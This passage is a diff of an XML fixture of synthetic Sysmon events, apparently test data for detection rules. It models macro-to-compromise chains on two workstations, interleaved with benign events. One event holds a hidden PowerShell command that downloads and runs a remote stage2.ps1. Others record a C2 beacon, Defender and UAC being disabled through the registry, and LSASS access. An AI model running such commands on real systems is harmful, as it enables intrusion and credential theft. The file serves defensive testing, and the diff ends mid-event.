@@ -2,10 +2,13 @@
 <Events>
 
   <!-- ================================================================ -->
-  <!-- PROCESS CREATION EVENTS (Event ID 1)                             -->
+  <!-- WORKSTATION-01 — Scenario A: Macro dropper to full compromise     -->
+  <!-- Attack chain: WINWORD macro → cmd → enumeration → LOLBin download -->
+  <!--               → MSHTA → wscript C2 → registry persistence         -->
+  <!--               → Defender disabled → UAC bypass → LSASS dump        -->
   <!-- ================================================================ -->
 
-  <!-- Event 1: PowerShell with -EncodedCommand — triggers PROC-001 -->
+  <!-- Event 1001: PowerShell encoded command — triggers PROC-001 -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
@@ -48,7 +51,7 @@
     </EventData>
   </Event>
 
-  <!-- Event 2: cmd.exe spawned by WINWORD.EXE — triggers PROC-002 -->
+  <!-- Event 1002: cmd.exe spawned by WINWORD.EXE — triggers PROC-002 -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
@@ -91,7 +94,7 @@
     </EventData>
   </Event>
 
-  <!-- Event 3: net.exe with "user" in CommandLine — triggers PROC-003 -->
+  <!-- Event 1003: net.exe user enumeration — triggers PROC-003 -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
@@ -134,7 +137,7 @@
     </EventData>
   </Event>
 
-  <!-- Event 4: whoami.exe — triggers PROC-004 -->
+  <!-- Event 1004: whoami.exe — triggers PROC-004 -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
@@ -177,7 +180,7 @@
     </EventData>
   </Event>
 
-  <!-- Event 5: certutil.exe with -urlcache — triggers PROC-005 -->
+  <!-- Event 1005: certutil LOLBin download — triggers PROC-005 -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
@@ -220,7 +223,7 @@
     </EventData>
   </Event>
 
-  <!-- Event 6: mshta.exe — triggers PROC-006 -->
+  <!-- Event 1006: mshta.exe remote HTA execution — triggers PROC-006 -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
@@ -263,7 +266,7 @@
     </EventData>
   </Event>
 
-  <!-- Event 7: chrome.exe normal launch — benign -->
+  <!-- Event 1007: chrome.exe normal launch — benign, no rule fires -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
@@ -306,7 +309,7 @@
     </EventData>
   </Event>
 
-  <!-- Event 8: svchost.exe — benign -->
+  <!-- Event 1008: svchost.exe — benign system process -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
@@ -349,11 +352,54 @@
     </EventData>
   </Event>
 
+  <!-- Event 1009: notepad.exe launched by explorer — benign, no rule fires -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-04-03T14:22:50.001234500Z"/>
+      <EventRecordID>1009</EventRecordID>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION-01</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-04-03 14:22:50.001</Data>
+      <Data Name="ProcessGuid">{11111111-1111-1111-1111-111111111109}</Data>
+      <Data Name="ProcessId">9100</Data>
+      <Data Name="Image">C:\Windows\System32\notepad.exe</Data>
+      <Data Name="FileVersion">10.0.19041.1</Data>
+      <Data Name="Description">Notepad</Data>
+      <Data Name="Product">Microsoft Windows Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">NOTEPAD.EXE</Data>
+      <Data Name="CommandLine">"C:\Windows\System32\notepad.exe" C:\Users\jsmith\notes.txt</Data>
+      <Data Name="CurrentDirectory">C:\Users\jsmith\</Data>
+      <Data Name="User">WORKSTATION-01\jsmith</Data>
+      <Data Name="LogonGuid">{11111111-1111-1111-1111-111111110000}</Data>
+      <Data Name="LogonId">0x3e7</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">SHA256=3333333333333333333333333333333333333333333333333333333333333333</Data>
+      <Data Name="ParentProcessGuid">{11111111-1111-1111-1111-111111111000}</Data>
+      <Data Name="ParentProcessId">3200</Data>
+      <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+      <Data Name="ParentCommandLine">C:\Windows\explorer.exe</Data>
+      <Data Name="ParentUser">WORKSTATION-01\jsmith</Data>
+    </EventData>
+  </Event>
+
   <!-- ================================================================ -->
-  <!-- NETWORK CONNECTION EVENTS (Event ID 3)                           -->
+  <!-- WORKSTATION-01 — Network events                                   -->
   <!-- ================================================================ -->
 
-  <!-- Event 9: chrome.exe on port 8080 — triggers NET-001 -->
+  <!-- Event 1010: chrome.exe on port 8080 — triggers NET-001 -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
@@ -364,7 +410,7 @@
       <Opcode>0</Opcode>
       <Keywords>0x8000000000000000</Keywords>
       <TimeCreated SystemTime="2026-04-03T14:23:00.123456700Z"/>
-      <EventRecordID>1009</EventRecordID>
+      <EventRecordID>1010</EventRecordID>
       <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
       <Computer>WORKSTATION-01</Computer>
       <Security UserID="S-1-5-18"/>
@@ -391,7 +437,7 @@
     </EventData>
   </Event>
 
-  <!-- Event 10: wscript.exe with empty DestinationHostname — triggers NET-002 and NET-003 -->
+  <!-- Event 1011: wscript.exe direct IP C2 — triggers NET-002 and NET-003 -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
@@ -402,7 +448,7 @@
       <Opcode>0</Opcode>
       <Keywords>0x8000000000000000</Keywords>
       <TimeCreated SystemTime="2026-04-03T14:23:05.234567800Z"/>
-      <EventRecordID>1010</EventRecordID>
+      <EventRecordID>1011</EventRecordID>
       <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
       <Computer>WORKSTATION-01</Computer>
       <Security UserID="S-1-5-18"/>
@@ -429,7 +475,45 @@
     </EventData>
   </Event>
 
-  <!-- Event 11: chrome.exe on port 443 — benign -->
+  <!-- Event 1012: cscript.exe direct IP beacon — triggers NET-002 and NET-003 -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+      <EventID>3</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>3</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-04-03T14:23:07.890123400Z"/>
+      <EventRecordID>1012</EventRecordID>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION-01</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-04-03 14:23:07.890</Data>
+      <Data Name="ProcessGuid">{11111111-1111-1111-1111-111111111121}</Data>
+      <Data Name="ProcessId">8200</Data>
+      <Data Name="Image">C:\Windows\System32\cscript.exe</Data>
+      <Data Name="User">WORKSTATION-01\jsmith</Data>
+      <Data Name="Protocol">tcp</Data>
+      <Data Name="Initiated">true</Data>
+      <Data Name="SourceIsIpv6">false</Data>
+      <Data Name="SourceIp">10.0.0.15</Data>
+      <Data Name="SourceHostname">WORKSTATION-01</Data>
+      <Data Name="SourcePort">50011</Data>
+      <Data Name="SourcePortName">-</Data>
+      <Data Name="DestinationIsIpv6">false</Data>
+      <Data Name="DestinationIp">10.10.10.99</Data>
+      <Data Name="DestinationHostname"></Data>
+      <Data Name="DestinationPort">4444</Data>
+      <Data Name="DestinationPortName">-</Data>
+    </EventData>
+  </Event>
+
+  <!-- Event 1013: chrome.exe on port 443 — benign HTTPS, no rule fires -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
@@ -440,7 +524,7 @@
       <Opcode>0</Opcode>
       <Keywords>0x8000000000000000</Keywords>
       <TimeCreated SystemTime="2026-04-03T14:23:10.345678900Z"/>
-      <EventRecordID>1011</EventRecordID>
+      <EventRecordID>1013</EventRecordID>
       <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
       <Computer>WORKSTATION-01</Computer>
       <Security UserID="S-1-5-18"/>
@@ -467,7 +551,7 @@
     </EventData>
   </Event>
 
-  <!-- Event 12: svchost.exe network connection — benign -->
+  <!-- Event 1014: svchost Windows Update — benign, no rule fires -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
@@ -478,7 +562,7 @@
       <Opcode>0</Opcode>
       <Keywords>0x8000000000000000</Keywords>
       <TimeCreated SystemTime="2026-04-03T14:23:15.456789100Z"/>
-      <EventRecordID>1012</EventRecordID>
+      <EventRecordID>1014</EventRecordID>
       <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
       <Computer>WORKSTATION-01</Computer>
       <Security UserID="S-1-5-18"/>
@@ -506,10 +590,10 @@
   </Event>
 
   <!-- ================================================================ -->
-  <!-- PROCESS ACCESS EVENTS (Event ID 10)                              -->
+  <!-- WORKSTATION-01 — Process access events                            -->
   <!-- ================================================================ -->
 
-  <!-- Event 13: lsass.exe targeted — no current rule, included for completeness -->
+  <!-- Event 1015: PowerShell opening lsass.exe with 0x1010 mask — triggers PA-001 and PA-002 -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
@@ -520,7 +604,7 @@
       <Opcode>0</Opcode>
       <Keywords>0x8000000000000000</Keywords>
       <TimeCreated SystemTime="2026-04-03T14:23:20.567890200Z"/>
-      <EventRecordID>1013</EventRecordID>
+      <EventRecordID>1015</EventRecordID>
       <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
       <Computer>WORKSTATION-01</Computer>
       <Security UserID="S-1-5-18"/>
@@ -540,7 +624,7 @@
     </EventData>
   </Event>
 
-  <!-- Event 14: Benign process access — no rule should trigger -->
+  <!-- Event 1016: Chrome opening its own process — benign self-access, no rule fires -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
@@ -551,7 +635,7 @@
       <Opcode>0</Opcode>
       <Keywords>0x8000000000000000</Keywords>
       <TimeCreated SystemTime="2026-04-03T14:23:25.678901300Z"/>
-      <EventRecordID>1014</EventRecordID>
+      <EventRecordID>1016</EventRecordID>
       <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
       <Computer>WORKSTATION-01</Computer>
       <Security UserID="S-1-5-18"/>
@@ -572,10 +656,10 @@
   </Event>
 
   <!-- ================================================================ -->
-  <!-- REGISTRY MODIFICATION EVENTS (Event ID 13)                       -->
+  <!-- WORKSTATION-01 — Registry modification events                     -->
   <!-- ================================================================ -->
 
-  <!-- Event 15: Run key modification — triggers REG-001 -->
+  <!-- Event 1017: mshta writing Run key — triggers REG-001 -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
@@ -586,7 +670,7 @@
       <Opcode>0</Opcode>
       <Keywords>0x8000000000000000</Keywords>
       <TimeCreated SystemTime="2026-04-03T14:23:30.789012400Z"/>
-      <EventRecordID>1015</EventRecordID>
+      <EventRecordID>1017</EventRecordID>
       <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
       <Computer>WORKSTATION-01</Computer>
       <Security UserID="S-1-5-18"/>
@@ -604,7 +688,7 @@
     </EventData>
   </Event>
 
-  <!-- Event 16: DisableRealtimeMonitoring — triggers REG-002 -->
+  <!-- Event 1018: PowerShell disabling Defender (value=1) — triggers REG-002 -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
@@ -615,7 +699,7 @@
       <Opcode>0</Opcode>
       <Keywords>0x8000000000000000</Keywords>
       <TimeCreated SystemTime="2026-04-03T14:23:35.890123500Z"/>
-      <EventRecordID>1016</EventRecordID>
+      <EventRecordID>1018</EventRecordID>
       <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
       <Computer>WORKSTATION-01</Computer>
       <Security UserID="S-1-5-18"/>
@@ -633,7 +717,7 @@
     </EventData>
   </Event>
 
-  <!-- Event 17: ConsentPromptBehaviorAdmin — triggers REG-003 -->
+  <!-- Event 1019: PowerShell setting UAC to 0 — triggers REG-003 -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
@@ -644,7 +728,7 @@
       <Opcode>0</Opcode>
       <Keywords>0x8000000000000000</Keywords>
       <TimeCreated SystemTime="2026-04-03T14:23:40.901234600Z"/>
-      <EventRecordID>1017</EventRecordID>
+      <EventRecordID>1019</EventRecordID>
       <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
       <Computer>WORKSTATION-01</Computer>
       <Security UserID="S-1-5-18"/>
@@ -659,6 +743,436 @@
       <Data Name="TargetObject">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin</Data>
       <Data Name="Details">DWORD (0x00000000)</Data>
       <Data Name="User">WORKSTATION-01\jsmith</Data>
+    </EventData>
+  </Event>
+
+  <!-- Event 1020: benign registry write — Software\Classes update, no rule fires -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+      <EventID>13</EventID>
+      <Version>2</Version>
+      <Level>4</Level>
+      <Task>13</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-04-03T14:23:45.012345600Z"/>
+      <EventRecordID>1020</EventRecordID>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION-01</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="EventType">SetValue</Data>
+      <Data Name="UtcTime">2026-04-03 14:23:45.012</Data>
+      <Data Name="ProcessGuid">{11111111-1111-1111-1111-111111111108}</Data>
+      <Data Name="ProcessId">892</Data>
+      <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
+      <Data Name="TargetObject">HKCU\Software\Classes\Local Settings\MuiCache\1E5\52C64B7E\LanguageList</Data>
+      <Data Name="Details">en-US</Data>
+      <Data Name="User">WORKSTATION-01\jsmith</Data>
+    </EventData>
+  </Event>
+
+  <!-- ================================================================ -->
+  <!-- WORKSTATION-02 — Scenario B: Excel macro to persistence           -->
+  <!-- Attack chain: EXCEL macro → PowerShell → net localgroup           -->
+  <!--               → Run key persistence → LSASS access                -->
+  <!-- Represents a lower-severity incident with fewer tactics covered   -->
+  <!-- ================================================================ -->
+
+  <!-- Event 2001: EXCEL spawning PowerShell — triggers PROC-002 -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-04-03T14:30:05.112233400Z"/>
+      <EventRecordID>2001</EventRecordID>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION-02</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-04-03 14:30:05.112</Data>
+      <Data Name="ProcessGuid">{22222222-2222-2222-2222-222222222201}</Data>
+      <Data Name="ProcessId">3344</Data>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="FileVersion">10.0.19041.1</Data>
+      <Data Name="Description">Windows PowerShell</Data>
+      <Data Name="Product">Microsoft Windows Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">PowerShell.EXE</Data>
+      <Data Name="CommandLine">powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.200/stage2.ps1')</Data>
+      <Data Name="CurrentDirectory">C:\Users\mwilson\Documents\</Data>
+      <Data Name="User">WORKSTATION-02\mwilson</Data>
+      <Data Name="LogonGuid">{22222222-2222-2222-2222-222222220000}</Data>
+      <Data Name="LogonId">0x4f3</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">SHA256=4444444444444444444444444444444444444444444444444444444444444444</Data>
+      <Data Name="ParentProcessGuid">{22222222-2222-2222-2222-222222222010}</Data>
+      <Data Name="ParentProcessId">5566</Data>
+      <Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE</Data>
+      <Data Name="ParentCommandLine">"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE" /n "C:\Users\mwilson\Downloads\Q1_report.xlsm"</Data>
+      <Data Name="ParentUser">WORKSTATION-02\mwilson</Data>
+    </EventData>
+  </Event>
+
+  <!-- Event 2002: PowerShell encoded command — triggers PROC-001 -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-04-03T14:30:18.334455600Z"/>
+      <EventRecordID>2002</EventRecordID>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION-02</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-04-03 14:30:18.334</Data>
+      <Data Name="ProcessGuid">{22222222-2222-2222-2222-222222222202}</Data>
+      <Data Name="ProcessId">3456</Data>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="FileVersion">10.0.19041.1</Data>
+      <Data Name="Description">Windows PowerShell</Data>
+      <Data Name="Product">Microsoft Windows Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">PowerShell.EXE</Data>
+      <Data Name="CommandLine">powershell.exe -EncodedCommand cwB0AGEAZwBlADIALgBwAHMAMQA=</Data>
+      <Data Name="CurrentDirectory">C:\Windows\System32\</Data>
+      <Data Name="User">WORKSTATION-02\mwilson</Data>
+      <Data Name="LogonGuid">{22222222-2222-2222-2222-222222220000}</Data>
+      <Data Name="LogonId">0x4f3</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">High</Data>
+      <Data Name="Hashes">SHA256=5555555555555555555555555555555555555555555555555555555555555555</Data>
+      <Data Name="ParentProcessGuid">{22222222-2222-2222-2222-222222222201}</Data>
+      <Data Name="ParentProcessId">3344</Data>
+      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ParentCommandLine">powershell.exe -NoP -NonI -W Hidden -Exec Bypass ...</Data>
+      <Data Name="ParentUser">WORKSTATION-02\mwilson</Data>
+    </EventData>
+  </Event>
+
+  <!-- Event 2003: net localgroup enumeration — triggers PROC-003 -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-04-03T14:30:25.556677800Z"/>
+      <EventRecordID>2003</EventRecordID>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION-02</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-04-03 14:30:25.556</Data>
+      <Data Name="ProcessGuid">{22222222-2222-2222-2222-222222222203}</Data>
+      <Data Name="ProcessId">3600</Data>
+      <Data Name="Image">C:\Windows\System32\net.exe</Data>
+      <Data Name="FileVersion">10.0.19041.1</Data>
+      <Data Name="Description">Net Command</Data>
+      <Data Name="Product">Microsoft Windows Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">net.exe</Data>
+      <Data Name="CommandLine">net localgroup Administrators</Data>
+      <Data Name="CurrentDirectory">C:\Windows\System32\</Data>
+      <Data Name="User">WORKSTATION-02\mwilson</Data>
+      <Data Name="LogonGuid">{22222222-2222-2222-2222-222222220000}</Data>
+      <Data Name="LogonId">0x4f3</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">High</Data>
+      <Data Name="Hashes">SHA256=CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</Data>
+      <Data Name="ParentProcessGuid">{22222222-2222-2222-2222-222222222202}</Data>
+      <Data Name="ParentProcessId">3456</Data>
+      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ParentCommandLine">powershell.exe -EncodedCommand cwB0AGEAZwBlADIALgBwAHMAMQA=</Data>
+      <Data Name="ParentUser">WORKSTATION-02\mwilson</Data>
+    </EventData>
+  </Event>
+
+  <!-- Event 2004: whoami.exe — triggers PROC-004 -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-04-03T14:30:28.778899000Z"/>
+      <EventRecordID>2004</EventRecordID>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION-02</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-04-03 14:30:28.778</Data>
+      <Data Name="ProcessGuid">{22222222-2222-2222-2222-222222222204}</Data>
+      <Data Name="ProcessId">3700</Data>
+      <Data Name="Image">C:\Windows\System32\whoami.exe</Data>
+      <Data Name="FileVersion">10.0.19041.1</Data>
+      <Data Name="Description">whoami - displays logged on user information</Data>
+      <Data Name="Product">Microsoft Windows Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">whoami.exe</Data>
+      <Data Name="CommandLine">whoami /groups</Data>
+      <Data Name="CurrentDirectory">C:\Windows\System32\</Data>
+      <Data Name="User">WORKSTATION-02\mwilson</Data>
+      <Data Name="LogonGuid">{22222222-2222-2222-2222-222222220000}</Data>
+      <Data Name="LogonId">0x4f3</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">High</Data>
+      <Data Name="Hashes">SHA256=DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD</Data>
+      <Data Name="ParentProcessGuid">{22222222-2222-2222-2222-222222222202}</Data>
+      <Data Name="ParentProcessId">3456</Data>
+      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ParentCommandLine">powershell.exe -EncodedCommand cwB0AGEAZwBlADIALgBwAHMAMQA=</Data>
+      <Data Name="ParentUser">WORKSTATION-02\mwilson</Data>
+    </EventData>
+  </Event>
+
+  <!-- Event 2005: explorer.exe launching calc.exe — benign, no rule fires -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-04-03T14:30:32.001122300Z"/>
+      <EventRecordID>2005</EventRecordID>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION-02</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-04-03 14:30:32.001</Data>
+      <Data Name="ProcessGuid">{22222222-2222-2222-2222-222222222205}</Data>
+      <Data Name="ProcessId">4100</Data>
+      <Data Name="Image">C:\Windows\System32\calc.exe</Data>
+      <Data Name="FileVersion">10.0.19041.1</Data>
+      <Data Name="Description">Windows Calculator</Data>
+      <Data Name="Product">Microsoft Windows Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">CALC.EXE</Data>
+      <Data Name="CommandLine">"C:\Windows\System32\calc.exe"</Data>
+      <Data Name="CurrentDirectory">C:\Windows\System32\</Data>
+      <Data Name="User">WORKSTATION-02\mwilson</Data>
+      <Data Name="LogonGuid">{22222222-2222-2222-2222-222222220000}</Data>
+      <Data Name="LogonId">0x4f3</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">SHA256=6666666666666666666666666666666666666666666666666666666666666666</Data>
+      <Data Name="ParentProcessGuid">{22222222-2222-2222-2222-222222222000}</Data>
+      <Data Name="ParentProcessId">2800</Data>
+      <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+      <Data Name="ParentCommandLine">C:\Windows\explorer.exe</Data>
+      <Data Name="ParentUser">WORKSTATION-02\mwilson</Data>
+    </EventData>
+  </Event>
+
+  <!-- ================================================================ -->
+  <!-- WORKSTATION-02 — Network events                                   -->
+  <!-- ================================================================ -->
+
+  <!-- Event 2006: PowerShell direct IP beacon (no hostname) — triggers NET-002 -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+      <EventID>3</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>3</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-04-03T14:30:40.223344500Z"/>
+      <EventRecordID>2006</EventRecordID>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION-02</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-04-03 14:30:40.223</Data>
+      <Data Name="ProcessGuid">{22222222-2222-2222-2222-222222222201}</Data>
+      <Data Name="ProcessId">3344</Data>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
